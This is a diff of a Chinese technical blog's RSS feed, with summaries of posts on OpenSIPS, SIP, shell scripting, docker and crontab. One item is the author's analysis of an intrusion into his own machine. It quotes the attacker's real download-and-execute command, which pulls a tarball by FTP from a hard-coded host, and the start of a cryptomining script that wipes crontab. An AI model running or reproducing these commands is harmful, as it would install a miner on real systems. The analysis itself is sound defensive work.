@@ -9,7 +9,16 @@
       <link>https://wdd.js.org/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</link>
     </image>
     <generator>Hugo -- gohugo.io</generator>
-    <lastBuildDate>Sun, 30 Oct 2022 21:11:16 +0800</lastBuildDate><atom:link href="https://wdd.js.org/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Mon, 31 Oct 2022 14:41:43 +0800</lastBuildDate><atom:link href="https://wdd.js.org/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>核心变量</title>
+      <link>https://wdd.js.org/opensips/core-vars/</link>
+      <pubDate>Mon, 31 Oct 2022 14:41:43 +0800</pubDate>
+      
+      <guid>https://wdd.js.org/opensips/core-vars/</guid>
+      <description>脚本变量 avp 变量 伪变量 SIP 头, $(hrd(name)) $(hdr(name)[N]) - represents the body of the N-th header identified by &amp;rsquo;name&amp;rsquo;. If [N] is omitted then the body of the first header is printed. The first header is got when N=0, for the second N=1, a.s.o. To print the last header of that type, use -1, no other negative values are supported now. No white spaces are allowed inside the specifier (before }, before or after {, [, ] symbols).</description>
+    </item>
+    
     <item>
       <title>SIP相关RFC协议</title>
       <link>https://wdd.js.org/opensips/ch1/sip-rfcs/</link>
@@ -1441,9 +1450,8 @@ var name = [ &amp;#34;aaa&amp;#34;, &amp;#34;bbb&amp;#34;, &amp;#34;ccc&amp;#34;
       <pubDate>Thu, 08 Jul 2021 09:17:30 +0800</pubDate>
       
       <guid>https://wdd.js.org/shell/sed-tips/</guid>
-      <description>直接在原文的基础上修改 sed -i &amp;#39;s/ABC/abc/g&amp;#39; some.txt 多次替换 方案1 使用分号 sed &amp;#39;s/ABC/abc/g;s/DEF/def/g&amp;#39; some.txt 方案2 多次使用-e sed -e &amp;#39;s/ABC/abc/g&amp;#39; -e &amp;#39;s/DEF/def/g&amp;#39; some.txt 转译/ 如果替换或者被替换的字符中本来就有/, 那么替换就会无法达到预期效果，那么我们可以用其他的字符来替代/。
-The / characters may be uniformly replaced by any other single character within any given s command. The / character (or whatever other character is used in its stead) can appear in the regexp or replacement only if it is preceded by a \ character. https://www.gnu.org/software/sed/manual/sed.html
-# 可以用#来替代/ sed &amp;#39;s#ABC#de/#g&amp;#39; some.</description>
+      <description>直接在原文的基础上修改 sed -i &amp;#39;s/ABC/abc/g&amp;#39; some.txt 多次替换 方案 1 使用分号 sed &amp;#39;s/ABC/abc/g;s/DEF/def/g&amp;#39; some.txt 方案 2 多次使用-e sed -e &amp;#39;s/ABC/abc/g&amp;#39; -e &amp;#39;s/DEF/def/g&amp;#39; some.txt 转译/ 如果替换或者被替换的字符中本来就有/, 那么替换就会无法达到预期效果，那么我们可以用其他的字符来替代/。
+The / characters may be uniformly replaced by any other single character within any given s command. The / character (or whatever other character is used in its stead) can appear in the regexp or replacement only if it is preceded by a \ character. https://www.gnu.org/software/sed/manual/sed.html</description>
     </item>
     
     <item>
@@ -1452,9 +1460,8 @@ The / characters may be uniformly replaced by any other single character within 
       <pubDate>Thu, 08 Jul 2021 09:17:30 +0800</pubDate>
       
       <guid>https://wdd.js.org/shell/set-replace/</guid>
-      <description>直接在原文的基础上修改 sed -i &amp;#39;s/ABC/abc/g&amp;#39; some.txt 多次替换 方案1 使用分号 sed &amp;#39;s/ABC/abc/g;s/DEF/def/g&amp;#39; some.txt 方案2 多次使用-e sed -e &amp;#39;s/ABC/abc/g&amp;#39; -e &amp;#39;s/DEF/def/g&amp;#39; some.txt 转译/ 如果替换或者被替换的字符中本来就有/, 那么替换就会无法达到预期效果，那么我们可以用其他的字符来替代/。
-The / characters may be uniformly replaced by any other single character within any given s command. The / character (or whatever other character is used in its stead) can appear in the regexp or replacement only if it is preceded by a \ character. https://www.gnu.org/software/sed/manual/sed.html
-# 可以用#来替代/ sed &amp;#39;s#ABC#de/#g&amp;#39; some.</description>
+      <description>直接在原文的基础上修改 sed -i &amp;#39;s/ABC/abc/g&amp;#39; some.txt 多次替换 方案 1 使用分号 sed &amp;#39;s/ABC/abc/g;s/DEF/def/g&amp;#39; some.txt 方案 2 多次使用-e sed -e &amp;#39;s/ABC/abc/g&amp;#39; -e &amp;#39;s/DEF/def/g&amp;#39; some.txt 转译/ 如果替换或者被替换的字符中本来就有/, 那么替换就会无法达到预期效果，那么我们可以用其他的字符来替代/。
+The / characters may be uniformly replaced by any other single character within any given s command. The / character (or whatever other character is used in its stead) can appear in the regexp or replacement only if it is preceded by a \ character. https://www.gnu.org/software/sed/manual/sed.html</description>
     </item>
     
     <item>
@@ -3056,11 +3063,10 @@ code 断开原因码 reason 具体原因 wasClean 是否是正常断开 官方�
       <pubDate>Wed, 24 Jun 2020 08:51:48 +0800</pubDate>
       
       <guid>https://wdd.js.org/opensips/ch1/offer-answer/</guid>
-      <description>
-1. 简介 媒体协商用来交换呼叫双方的媒体能力。如
-支持的编码类型有哪些 采样频率是多少 媒体端口，ip信息 &amp;hellip; 媒体协商使用的是请求和应答模型。即一方向另一方发送含有sdp信息的消息，然后另一方更具对方提供的编码以及自己支持的编码，如果协商成功，则将协商后的消息sdp再次发送给对方。
-2. 常见的几个协商方式 2.1 在INVITE中offer 2.2 在200 OK 中offer 2.3 在UPDATE中offer 2.4 在PRACK中offer 3. 常见的几个问题 一般呼叫到中继测时，中继回的183信令是会携带sdp信息的 一般打到分机时，分机回的180信令是没有sdp信息的 不要先入为主的认为，某些请求一定带有sdp，某些请求一定没有sdp。而应当去测试请求或者响应消息上有没有携带sdp信息。
-携带sdp信息的sip消息会出现下面的头
+      <description>1. 简介 媒体协商用来交换呼叫双方的媒体能力。如
+支持的编码类型有哪些 采样频率是多少 媒体端口，ip 信息 &amp;hellip; 媒体协商使用的是请求和应答模型。即一方向另一方发送含有 sdp 信息的消息，然后另一方更具对方提供的编码以及自己支持的编码，如果协商成功，则将协商后的消息 sdp 再次发送给对方。
+2. 常见的几个协商方式 2.1 在 INVITE 中 offer 2.2 在 200 OK 中 offer 2.3 在 UPDATE 中 offer 2.4 在 PRACK 中 offer 3. 常见的几个问题 一般呼叫到中继测时，中继回的 183 信令是会携带 sdp 信息的 一般打到分机时，分机回的 180 信令是没有 sdp 信息的 不要先入为主的认为，某些请求一定带有 sdp，某些请求一定没有 sdp。而应当去测试请求或者响应消息上有没有携带 sdp 信息。
+携带 sdp 信息的 sip 消息会出现下面的头
 Content-Type: application/sdp </description>
     </item>
     
@@ -3345,8 +3351,8 @@ docker pull kaldiasr/kaldi This is the official Docker Hub of the Kaldi project:
       <pubDate>Mon, 11 May 2020 13:01:07 +0800</pubDate>
       
       <guid>https://wdd.js.org/shell/cond-test/</guid>
-      <description>if # if if condition; then commands; fi # if else if if condition; then commands; elif condition; then commands; else commands; fi 简单版本的if测试
-[ condtion ] &amp;amp;&amp;amp; action; [ conditio ] || action; 算数比较 [ $var -eq 0 ] #当var等于0 [ $var -ne 0 ] #当var不等于0 -gt 大于 -lt 小于 -ge 大于或等于 -le 小于或等于 使用-a, -o可以组合复杂的测试。
+      <description>if # if if condition; then commands; fi # if else if if condition; then commands; elif condition; then commands; else commands; fi 简单版本的 if 测试
+[ condtion ] &amp;amp;&amp;amp; action; [ conditio ] || action; 算数比较 [ $var -eq 0 ] #当var等于0 [ $var -ne 0 ] #当var不等于0 -gt 大于 -lt 小于 -ge 大于或等于 -le 小于或等于 使用-a, -o 可以组合复杂的测试。
 [ $var -ne 0 -a $var -gt 2 ] # -a相当于并且 [ $var -ne 0 -o $var -gt 2 ] # -o相当于或 文件比较 [ -f $file ] # 如果file是存在的文件路径或者文件名，则返回真 -f 测试文件路径或者文件是否存在 -x 测试文件是否可执行 -e 测试文件是否存在 -c 测试文件是否是字符设备 -b 测试文件是否是块设备 -w 测试文件是否可写 -r 测试文件是否可读 -L 测试文件是否是一个符号链接 字符串比较 字符串比较一定要用双中括号。</description>
     </item>
     
@@ -3487,11 +3493,11 @@ lsof -c 进程名lsof -p 进程号lsof filename # 查看某个文件被哪个进
       <guid>https://wdd.js.org/opensips/ch1/story-of-nat/</guid>
       <description>设想一下，如果国家规定，给孩子起名字的时候，不能和已经使用过的活着的人名字相同，会发生什么事情？
 除非把名字起得越来越长，否则名字很快就不够用了。
-在1993年的时候，有人就遇到类似的问题，因为IP地址快被用完了。
+在 1993 年的时候，有人就遇到类似的问题，因为 IP 地址快被用完了。
 他们想出两个方案：
-短期方案：CIDR(Classless InterDomain Routing) 长期方案：开发新的具有更大地址空间的互联网协议。可以认为是目前的IPv6 当然了长期方案不是一蹴而就的，短期方案才是解决眼前问题的方案。
+短期方案：CIDR(Classless InterDomain Routing) 长期方案：开发新的具有更大地址空间的互联网协议。可以认为是目前的 IPv6 当然了长期方案不是一蹴而就的，短期方案才是解决眼前问题的方案。
 a very small percentage of hosts in a stub domain are communicating outside of the domain at any given time
-短期的方案基于一个逻辑事实：在一个网络中，只有非常少的几个主机需要跟外部网络交流。也就是说，大部分的主机都在内部交流。那么内部交流的这些主机，实际上并不需要给设置公网IP。（但是这个只是1993年的那个时期的事实）**可以类比于，班级内部之间的学生交流很多。班级与班级之间的交流，估计只有班长之间交流。
+短期的方案基于一个逻辑事实：在一个网络中，只有非常少的几个主机需要跟外部网络交流。也就是说，大部分的主机都在内部交流。那么内部交流的这些主机，实际上并不需要给设置公网 IP。（但是这个只是 1993 年的那个时期的事实）**可以类比于，班级内部之间的学生交流很多。班级与班级之间的交流，估计只有班长之间交流。
 参考 https://tools.ietf.org/html/rfc1631 https://tools.ietf.org/html/rfc1996 https://tools.ietf.org/html/rfc2663 https://tools.ietf.org/html/rfc2993 </description>
     </item>
     
@@ -3848,8 +3854,8 @@ case &amp;#34;$var&amp;#34; in *sub_string*) # Do stuff ;; *sub_string2*) # Do m
       <pubDate>Thu, 26 Dec 2019 10:34:15 +0800</pubDate>
       
       <guid>https://wdd.js.org/shell/list-active-host/</guid>
-      <description>使用ping 优点 原生，不用安装软件 缺点 速度慢 下面的脚本列出 192.168.1.0/24的所有主机，大概需要255秒
-#!/bin/bash function handler () { echo &amp;#34;will exit&amp;#34; exit 0 } trap &amp;#39;handler&amp;#39; SIGINT for ip in 192.168.1.{1..255} do ping -W 1 -c 1 $ip &amp;amp;&amp;gt; /dev/null if [ $? -eq 0 ]; then echo $ip is alive else echo $ip is dead fi done 使用fping 优点 速度快 缺点 需要安装fping # 安装fping brew install fping # mac yum install fping # centos apt install fping # debian 我用的fping 是MacOS X， fping的版本是4.</description>
+      <description>使用 ping 优点 原生，不用安装软件 缺点 速度慢 下面的脚本列出 192.168.1.0/24 的所有主机，大概需要 255 秒
+#!/bin/bash function handler () { echo &amp;#34;will exit&amp;#34; exit 0 } trap &amp;#39;handler&amp;#39; SIGINT for ip in 192.168.1.{1..255} do ping -W 1 -c 1 $ip &amp;amp;&amp;gt; /dev/null if [ $? -eq 0 ]; then echo $ip is alive else echo $ip is dead fi done 使用 fping 优点 速度快 缺点 需要安装 fping # 安装fping brew install fping # mac yum install fping # centos apt install fping # debian 我用的 fping 是 MacOS X， fping 的版本是 4.</description>
     </item>
     
     <item>
@@ -3859,9 +3865,9 @@ case &amp;#34;$var&amp;#34; in *sub_string*) # Do stuff ;; *sub_string2*) # Do m
       
       <guid>https://wdd.js.org/shell/evil-script/</guid>
       <description>机器被入侵了，写点东西，分析一下入侵脚本，顺便也学习一下。
-bash -c curl -O ftp://noji:noji2012@153.122.137.67/.kde/sshd.tgz;tar xvf sshd.tgz;rm -rf sshd.tgz;cd .ssd;chmod +x *;./go -r 下载恶意软件 恶意软件的是使用 ftp下载的， 地址是：ftp://noji:noji2012@153.122.137.67/.kde/sshd.tgz，这个153.122.137.67 IP是位于日本东京，ssd.taz是一个tar包，用tar解压之后，出现一个sh文件，两个可执行文件。
--rwxr-xr-x 1 1001 1001 907 Nov 20 20:58 go # shell -rwxrwxr-x 1 1001 1001 1.3M Nov 20 21:06 i686 # 可执行 -rwxrwxr-x 1 1001 1001 1.1M Nov 20 21:06 x86_64 # 可执行 分析可执行文件 go go是一个shell程序，下文是分析
-#!/bin/bash # pool.supportxmr.com门罗币的矿池 # 所以大家应该清楚了，入侵的机器应该用来挖矿的 # 这一步是测试本机与矿池dns是否通 if [ $(ping -c 1 pool.supportxmr.com 2&amp;gt;/dev/null|grep &amp;#34;bytes of data&amp;#34; | wc -l ) -gt &amp;#39;0&amp;#39; ]; then dns=&amp;#34;&amp;#34; # dns通 else dns=&amp;#34;-d&amp;#34; # dns不通 fi # 删除用户计划任务，并将报错信息清除 crontab -r 2&amp;gt;/dev/null # 这一步不太懂 rm -rf /tmp/.</description>
+bash -c curl -O ftp://noji:noji2012@153.122.137.67/.kde/sshd.tgz;tar xvf sshd.tgz;rm -rf sshd.tgz;cd .ssd;chmod +x *;./go -r 下载恶意软件 恶意软件的是使用 ftp 下载的， 地址是：ftp://noji:noji2012@153.122.137.67/.kde/sshd.tgz，这个 153.122.137.67 IP 是位于日本东京，ssd.taz 是一个 tar 包，用 tar 解压之后，出现一个 sh 文件，两个可执行文件。
+-rwxr-xr-x 1 1001 1001 907 Nov 20 20:58 go # shell -rwxrwxr-x 1 1001 1001 1.3M Nov 20 21:06 i686 # 可执行 -rwxrwxr-x 1 1001 1001 1.1M Nov 20 21:06 x86_64 # 可执行 分析可执行文件 go go 是一个 shell 程序，下文是分析
+#!/bin/bash # pool.</description>
     </item>
     
     <item>
@@ -4258,7 +4264,7 @@ domain 表示通信域，最长见的有以下两个域 AF_INET 因特网通信 
       
       <guid>https://wdd.js.org/shell/match-eval/</guid>
       <description>主要的数据运算方式
-let (()) [] expr bc 使用let 使用let时，等号右边的变量不需要在加上$符号
+let (()) [] expr bc 使用 let 使用 let 时，等号右边的变量不需要在加上$符号
 #!/bin/bash no1=1; no2=2; # 注意两个变量的值的类型实际上是字符串 re1=$no1+$no2 # 注意此时re1的值是1+2 let result=no1+no2 # 此时才是想获取的两数字的和，3 </description>
     </item>
     
@@ -4268,8 +4274,7 @@ let (()) [] expr bc 使用let 使用let时，等号右边的变量不需要在�
       <pubDate>Sat, 26 Oct 2019 14:16:28 +0800</pubDate>
       
       <guid>https://wdd.js.org/shell/string-operator/</guid>
-      <description>
-获取字符串长度 需要在变量前加个**#**
+      <description>获取字符串长度 需要在变量前加个**#**
 name=wdd echo ${#name} 首尾去空格 echo &amp;#34; abcd &amp;#34; | xargs 字符串包含 # $var是否包含字符串A if [[ $var =~ &amp;#34;A&amp;#34; ]]; then echo fi # $var是否以字符串A开头 if [[ $var =~ &amp;#34;^A&amp;#34; ]]; then echo fi # $var是否以字符串A结尾 if [[ $var =~ &amp;#34;A$&amp;#34; ]]; then echo fi 字符串提取 #!/bin/bash num1=${test#*_} num2=${num1#*_} surname=${num2%_*} num4=${test##*_} profession=${num4%.*} #*_ 从左边开始，去第一个符号“_”左边的所有字符 % _* 从右边开始，去掉第一个符号“_”右边的所有字符 ##*_ 从右边开始，去掉第一个符号“_”左边的所有字符 %%_* 从左边开始，去掉第一个符号“_”右边的所有字符 判断某个字符串是否以特定字符开头 if [[ $TAG =~ ABC* ]]; then echo $TAG is begin with ABC fi </description>
     </item>
     
@@ -4322,8 +4327,7 @@ create index index_agent on prd(agent) # 创建索引 show index from prd # 显�
       <pubDate>Fri, 18 Oct 2019 13:06:58 +0800</pubDate>
       
       <guid>https://wdd.js.org/shell/flow-control/</guid>
-      <description>
-if then // good if [ -d public ] then echo &amp;#34;public exist&amp;#34; if // good if [ -d public ]; then echo &amp;#34;public exist&amp;#34; if // error: if和then写成一行时，条件后必须加上分号 if [ -d public ] then echo &amp;#34;public exist&amp;#34; if // error: shell对空格比较敏感，多个空格和少个空格，执行的含义完全不同 // 在[]中，内侧前后都需要加上空格 if [-d public] then echo &amp;#34;public exist&amp;#34; if if elif then if [ -d public ] then echo &amp;#34;public exist&amp;#34; elif then 循环 switch 常用例子 判断目录是否存在 if [ -d public ] then echo &amp;#34;public exist&amp;#34; if 判断文件是否存在 </description>
+      <description>if then // good if [ -d public ] then echo &amp;#34;public exist&amp;#34; if // good if [ -d public ]; then echo &amp;#34;public exist&amp;#34; if // error: if和then写成一行时，条件后必须加上分号 if [ -d public ] then echo &amp;#34;public exist&amp;#34; if // error: shell对空格比较敏感，多个空格和少个空格，执行的含义完全不同 // 在[]中，内侧前后都需要加上空格 if [-d public] then echo &amp;#34;public exist&amp;#34; if if elif then if [ -d public ] then echo &amp;#34;public exist&amp;#34; elif then 循环 switch 常用例子 判断目录是否存在 if [ -d public ] then echo &amp;#34;public exist&amp;#34; if 判断文件是否存在 </description>
     </item>
     
     <item>
@@ -4332,8 +4336,7 @@ if then // good if [ -d public ] then echo &amp;#34;public exist&amp;#34; if // 
       <pubDate>Wed, 16 Oct 2019 13:57:29 +0800</pubDate>
       
       <guid>https://wdd.js.org/shell/colorful-print/</guid>
-      <description>
-打印彩色字体 0 重置 30 黑色 31 红色 32 绿色 33 黄色 34 蓝色 35 洋红 36 青色 37 白色 把31改成其他数字，就可打印其他颜色的this了。大部分情况下，我们只需要记住红色和绿色就可以了
+      <description>打印彩色字体 0 重置 30 黑色 31 红色 32 绿色 33 黄色 34 蓝色 35 洋红 36 青色 37 白色 把 31 改成其他数字，就可打印其他颜色的 this 了。大部分情况下，我们只需要记住红色和绿色就可以了
 echo -e &amp;#34;\e[1;31m this \e[0m whang&amp;#34; 打印彩色背景 0 重置 40 黑色 41 红色 42 绿色 43 黄色 44 蓝色 45 洋红 46 青色 47 白色 echo -e &amp;#34;\e[1;45m this \e[0m whang&amp;#34; </description>
     </item>
     
@@ -4588,7 +4591,7 @@ git命令虽然多，但是经常使用的不超过8个。
       <pubDate>Tue, 15 Oct 2019 21:43:41 +0800</pubDate>
       
       <guid>https://wdd.js.org/opensips/ch1/csta-call-model/</guid>
-      <description>1. 内容概要 CSTA协议与标准概述 CSTA OpenScape 语音架构概述 2. CSTA协议标准 2.1. 什么是CSTA ? CSTA：电脑支持通讯程序(Computer Supported TelecommunicationsApplications) 基本的呼叫模型在1992建立，后来随着行业发展，呼叫模型也被加强和扩展，例如新的协议等等 CSTA是一个应用层接口，用来监控呼叫，设备和网络 CSTA创建了一个通讯程序的抽象层: CSTA并不依赖任何底层的信令协议 E.g.H.323,SIP,Analog,T1,ISDN,etc. CSTA并不要求用户必须使用某些设备 E.g.intelligentendpoints,low-function/stimulusdevices,SIPSignalingmodels-3PCC vs. Peer/Peer 适用不同的操作模式 第三方呼叫控制 一方呼叫控制 CSTA的设计目标是为了提高各种CSTA实现之间的移植性 规范化呼叫模型和行为 完成服务、事件定义 规范化标准 3. CSTA 标准的进化史 阶段1 (发布于 June ’92) 40 特性, 66 页 (服务定义) 专注于呼叫控制 阶段2 (发布于 Dec. ’94) 77 特性, 145 页 (服务定义) I/O &amp;amp; 语音单元服务, 更多呼叫控制服务 阶段3 - CSTA Phase II Features &amp;amp; versit CTI Technology 发布于 Dec. ‘98 136 特性, 650 页 (服务定义) 作为ISO 标准发布于 July 2000 发布 CSTA XML (ECMA-323) June 2004 发布 “Using CSTA with Voice Browsers” (TR/85) Dec.</description>
+      <description>1. 内容概要 CSTA 协议与标准概述 CSTA OpenScape 语音架构概述 2. CSTA 协议标准 2.1. 什么是 CSTA ? CSTA：电脑支持通讯程序(Computer Supported TelecommunicationsApplications) 基本的呼叫模型在 1992 建立，后来随着行业发展，呼叫模型也被加强和扩展，例如新的协议等等 CSTA 是一个应用层接口，用来监控呼叫，设备和网络 CSTA 创建了一个通讯程序的抽象层: CSTA 并不依赖任何底层的信令协议 E.g.H.323,SIP,Analog,T1,ISDN,etc. CSTA 并不要求用户必须使用某些设备 E.g.intelligentendpoints,low-function/stimulusdevices,SIPSignalingmodels-3PCC vs. Peer/Peer 适用不同的操作模式 第三方呼叫控制 一方呼叫控制 CSTA 的设计目标是为了提高各种 CSTA 实现之间的移植性 规范化呼叫模型和行为 完成服务、事件定义 规范化标准 3. CSTA 标准的进化史 阶段 1 (发布于 June ’92) 40 特性, 66 页 (服务定义) 专注于呼叫控制 阶段 2 (发布于 Dec. ’94) 77 特性, 145 页 (服务定义) I/O &amp;amp; 语音单元服务, 更多呼叫控制服务 阶段 3 - CSTA Phase II Features &amp;amp; versit CTI Technology 发布于 Dec.</description>
     </item>
     
     <item>
@@ -4599,12 +4602,10 @@ git命令虽然多，但是经常使用的不超过8个。
       <guid>https://wdd.js.org/shell/grep-awk-sort/</guid>
       <description>test.log
 2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;A&amp;#34; loginIn 2019-1010-1920 192.345.23.1 cause:&amp;#34;BBB&amp;#34; type:&amp;#34;A&amp;#34; loginIn 2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;S&amp;#34; loginIn 2019-1010-1920 192.345.23.1 cause:&amp;#34;BBJ&amp;#34; type:&amp;#34;A&amp;#34; loginIn 按列分割 提取第三列
-日志列数比较少或则要提取的字段比较靠前时，优先使用awk。当然cut也可以做到。
+日志列数比较少或则要提取的字段比较靠前时，优先使用 awk。当然 cut 也可以做到。
 比如输出日志的第三列
-awk &amp;#39;{print $3}&amp;#39; test.log // $3表示第三列 cut -d &amp;#34; &amp;#34; -f3 test.log // -f3指定第三列, -d用来指定分割符 正则提取 提取cause字段的原因值？
-2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;A&amp;#34; loginIn 2019-1010-1920 192.345.23.1 type:&amp;#34;A&amp;#34; loginIn cause:&amp;#34;BBB&amp;#34; 2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;S&amp;#34; loginIn 2019-1010-1920 192.345.23.1 type:&amp;#34;A&amp;#34; cause:&amp;#34;BBJ&amp;#34; loginIn 当要提取的内容不在同一列时，往往就无法用cut或者awk就按列提取。最好用的方式是用grep的正则提取。
-好像grep不支持捕获分组，所以只能提取出出cause:&amp;ldquo;AAA&amp;rdquo;，而无法直接提取出AAA
-E 表示使用正则 o 表示只显示匹配到的内容 &amp;gt; grep -Eo &amp;#39;cause:&amp;#34;.</description>
+awk &amp;#39;{print $3}&amp;#39; test.log // $3表示第三列 cut -d &amp;#34; &amp;#34; -f3 test.log // -f3指定第三列, -d用来指定分割符 正则提取 提取 cause 字段的原因值？
+2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;A&amp;#34; loginIn 2019-1010-1920 192.345.23.1 type:&amp;#34;A&amp;#34; loginIn cause:&amp;#34;BBB&amp;#34; 2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;S&amp;#34; loginIn 2019-1010-1920 192.345.23.1 type:&amp;#34;A&amp;#34; cause:&amp;#34;BBJ&amp;#34; loginIn 当要提取的内容不在同一列时，往往就无法用cut或者awk就按列提取。最好用的方式是用 grep 的正则提取。</description>
     </item>
     
     <item>
@@ -4999,9 +5000,9 @@ npm install -g xmysqlxmysql -h localhost -u mysqlUsername -p mysqlPassword -d da
       <pubDate>Tue, 06 Aug 2019 13:48:13 +0800</pubDate>
       
       <guid>https://wdd.js.org/shell/docker-clean-tips/</guid>
-      <description>使用jenkins作为打包的工具，主机上的磁盘空间总是被慢慢被占满，直到jenkins无法运行。本文从几个方面来清理docker垃圾。
-批量删除已经退出的容器 docker ps -a | grep &amp;#34;Exited&amp;#34; | awk &amp;#39;{print $1 }&amp;#39; | xargs docker rm 批量删除带有none字段的镜像 $3一般就是取出每一行的镜像id字段
-# 方案1： 根据镜像id删除镜像 docker images| grep none |awk &amp;#39;{print $3 }&amp;#39;|xargs docker rmi # 方案2: 根据镜像名删除镜像 docker images | grep wecloud | awk &amp;#39;{print $1&amp;#34;:&amp;#34;$2}&amp;#39; | xargs docker rmi 方案1，根据镜像ID删除镜像时，有写镜像虽然镜像名不同，但是镜像ID都是相同的，这是后往往会删除失败。所以根据镜像名删除镜像的效果会更好。
+      <description>使用 jenkins 作为打包的工具，主机上的磁盘空间总是被慢慢被占满，直到 jenkins 无法运行。本文从几个方面来清理 docker 垃圾。
+批量删除已经退出的容器 docker ps -a | grep &amp;#34;Exited&amp;#34; | awk &amp;#39;{print $1 }&amp;#39; | xargs docker rm 批量删除带有 none 字段的镜像 $3 一般就是取出每一行的镜像 id 字段
+# 方案1： 根据镜像id删除镜像 docker images| grep none |awk &amp;#39;{print $3 }&amp;#39;|xargs docker rmi # 方案2: 根据镜像名删除镜像 docker images | grep wecloud | awk &amp;#39;{print $1&amp;#34;:&amp;#34;$2}&amp;#39; | xargs docker rmi 方案 1，根据镜像 ID 删除镜像时，有写镜像虽然镜像名不同，但是镜像 ID 都是相同的，这是后往往会删除失败。所以根据镜像名删除镜像的效果会更好。
 删除镜像定时任务脚本 #!/bin/bash # create by wangduanduan # when current free disk less then max free disk, you can remove docker images # GREEN=&amp;#39;\033[0;32m&amp;#39; RED=&amp;#39;\033[0;31m&amp;#39; NC=&amp;#39;\033[0m&amp;#39; max_free_disk=5 # 5G.</description>
     </item>
     
@@ -5012,10 +5013,9 @@ npm install -g xmysqlxmysql -h localhost -u mysqlUsername -p mysqlPassword -d da
       
       <guid>https://wdd.js.org/shell/log-ana/</guid>
       <description>test.log
-2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;A&amp;#34; loginIn 2019-1010-1920 192.345.23.1 cause:&amp;#34;BBB&amp;#34; type:&amp;#34;A&amp;#34; loginIn 2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;S&amp;#34; loginIn 2019-1010-1920 192.345.23.1 cause:&amp;#34;BBJ&amp;#34; type:&amp;#34;A&amp;#34; loginIn 按列分割 提取第三列日志列数比较少或则要提取的字段比较靠前时，优先使用awk。当然cut也可以做到。比如输出日志的第三列
-awk &amp;#39;{print $3}&amp;#39; test.log // $3表示第三列 cut -d &amp;#34; &amp;#34; -f3 test.log // -f3指定第三列, -d用来指定分割符 正则提取 提取cause字段的原因值？
-2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;A&amp;#34; loginIn 2019-1010-1920 192.345.23.1 type:&amp;#34;A&amp;#34; loginIn cause:&amp;#34;BBB&amp;#34; 2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;S&amp;#34; loginIn 2019-1010-1920 192.345.23.1 type:&amp;#34;A&amp;#34; cause:&amp;#34;BBJ&amp;#34; loginIn 当要提取的内容不在同一列时，往往就无法用cut或者awk就按列提取。最好用的方式是用grep的正则提取。好像grep不支持捕获分组，所以只能提取出出cause:&amp;ldquo;AAA&amp;rdquo;，而无法直接提取出AAA
-E 表示使用正则 o 表示只显示匹配到的内容 &amp;gt; grep -Eo &amp;#39;cause:&amp;#34;.*?&amp;#34;&amp;#39; test.log cause:&amp;#34;AAA&amp;#34; cause:&amp;#34;BBB&amp;#34; cause:&amp;#34;AAA&amp;#34; cause:&amp;#34;BBJ&amp;#34; 统计 对输出的关键词进行统计，并按照升序或者降序排列。将关键词按照列或者按照正则提取出来之后，首先要进行sort排序, 然后再进行uniq去重。不进行排序就直接去重，统计的值就不准确。因为uniq去重只能去除连续的相同字符串。不是连续的字符串，则会统计多次。下面例子：非连续的cause:&amp;ldquo;AAA&amp;rdquo;，没有被合并在一起计数</description>
+2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;A&amp;#34; loginIn 2019-1010-1920 192.345.23.1 cause:&amp;#34;BBB&amp;#34; type:&amp;#34;A&amp;#34; loginIn 2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;S&amp;#34; loginIn 2019-1010-1920 192.345.23.1 cause:&amp;#34;BBJ&amp;#34; type:&amp;#34;A&amp;#34; loginIn 按列分割 提取第三列日志列数比较少或则要提取的字段比较靠前时，优先使用 awk。当然 cut 也可以做到。比如输出日志的第三列
+awk &amp;#39;{print $3}&amp;#39; test.log // $3表示第三列 cut -d &amp;#34; &amp;#34; -f3 test.log // -f3指定第三列, -d用来指定分割符 正则提取 提取 cause 字段的原因值？
+2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;A&amp;#34; loginIn 2019-1010-1920 192.345.23.1 type:&amp;#34;A&amp;#34; loginIn cause:&amp;#34;BBB&amp;#34; 2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;S&amp;#34; loginIn 2019-1010-1920 192.345.23.1 type:&amp;#34;A&amp;#34; cause:&amp;#34;BBJ&amp;#34; loginIn 当要提取的内容不在同一列时，往往就无法用cut或者awk就按列提取。最好用的方式是用 grep 的正则提取。好像 grep 不支持捕获分组，所以只能提取出出 cause:&amp;ldquo;AAA&amp;rdquo;，而无法直接提取出 AAA</description>
     </item>
     
     <item>
@@ -5323,10 +5323,10 @@ DOCKER_STORAGE_OPTIONS=&amp;#34;-s overlay&amp;#34; systemctl daemon-reload serv
       <pubDate>Mon, 01 Jul 2019 18:59:57 +0800</pubDate>
       
       <guid>https://wdd.js.org/shell/crontab-tips/</guid>
-      <description>我已经在crontab上栽了很多次跟头了，我决定写个总结。
-常用的命令 crontab -l # 显示计划任务脚本 crontab -e # 编辑计划任务 计划任务的格式 时间格式 * # 每个最小单元 / # 时间步长，每隔多长时间执行 */10 - # 区间，如 4-9 , # 散列，如 4,9,10 几个例子 crontab 最小支持的时间单位是1分钟，不支持每个多少秒执行一次
